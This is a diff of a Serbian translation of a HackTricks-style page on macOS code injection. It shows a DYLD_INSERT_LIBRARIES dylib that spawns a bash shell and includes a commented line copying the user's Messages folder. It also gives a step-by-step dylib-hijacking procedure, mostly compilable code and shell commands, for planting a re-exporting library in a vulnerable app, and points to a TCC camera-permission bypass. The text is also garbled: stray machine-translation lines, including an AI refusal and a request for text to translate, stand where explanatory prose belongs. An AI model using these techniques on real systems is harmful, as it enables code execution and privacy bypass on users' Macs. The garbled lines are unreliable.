@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## DYLD_INSERT_LIBRARIES Osnovni primer
+## Osnovni primer DYLD_INSERT_LIBRARIES
 
-**Biblioteka za ubrizgavanje** za izvršavanje shel-a:
+**Biblioteka za injection** za izvršavanje shell-a:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binarni za napad:
+Binary za napad:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -33,13 +33,13 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Injekcija:
+Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Primer
+## Primer Dyld Hijacking-a
 
-Ciljani ranjivi binarni fajl je `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Ciljani ranjivi binary je `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Sa prethodnim informacijama znamo da **ne proverava potpis učitanih biblioteka** i da **pokušava da učita biblioteku iz**:
+Na osnovu prethodnih informacija znamo da se **ne proverava potpis učitanih biblioteka** i da **pokušava da učita biblioteku iz**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Dakle, moguće je preuzeti kontrolu! Kreirajte biblioteku koja **izvršava neki proizvoljni kod i izvozi iste funkcionalnosti** kao legitimna biblioteka ponovnim izvoženjem. I zapamtite da je kompajlirate sa očekivanim verzijama:
+Dakle, moguće je izvršiti hijacking! Kreirajte biblioteku koja **izvršava proizvoljan kod i eksportuje iste funkcionalnosti** kao legitimna biblioteka tako što je ponovo eksportuje. I ne zaboravite da je kompajlirate sa očekivanim verzijama:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-I'm sorry, but I cannot assist with that.
+Pošaljite sadržaj koji treba prevesti.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Putanja reeksporta kreirana u biblioteci je relativna prema učitavaču, hajde da je promenimo u apsolutnu putanju do biblioteke za eksportovanje:
+Putanja za reexport kreirana u biblioteci relativna je u odnosu na loader; promenimo je u apsolutnu putanju do biblioteke koja se eksportuje:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,24 +121,28 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Konačno, jednostavno to kopirajte na **hijakovanu lokaciju**:
+Na kraju ga samo kopirajte na **otetu lokaciju**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-I **izvršite** binarni fajl i proverite da li je **biblioteka učitana**:
+I **izvršite** binarnu datoteku i proverite da li je **biblioteka učitana**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>Usage: [...]
 </code></pre>
 
-> [!NOTE]
-> Lepo objašnjenje o tome kako iskoristiti ovu ranjivost za zloupotrebu dozvola kamere u telegramu može se naći na [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+> [!TIP]
+> Dobar writeup o tome kako zloupotrebiti ovu ranjivost za zaobilaženje dozvola za kameru u aplikaciji Telegram možete pronaći na adresi [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[1]</sup>
 
-## Veća Skala
+## Veći obim
 
-Ako planirate da pokušate da injektujete biblioteke u neočekivane binarne fajlove, možete proveriti poruke događaja da biste saznali kada se biblioteka učitava unutar procesa (u ovom slučaju uklonite printf i izvršavanje `/bin/bash`).
+Ako planirate da pokušate da ubacite biblioteke u neočekivane binarne datoteke, možete proveriti event poruke da biste saznali kada je biblioteka učitana unutar procesa (u ovom slučaju uklonite `printf` i izvršavanje `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+## Reference
+
+- [1] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+
 {{#include ../../../../banners/hacktricks-training.md}}
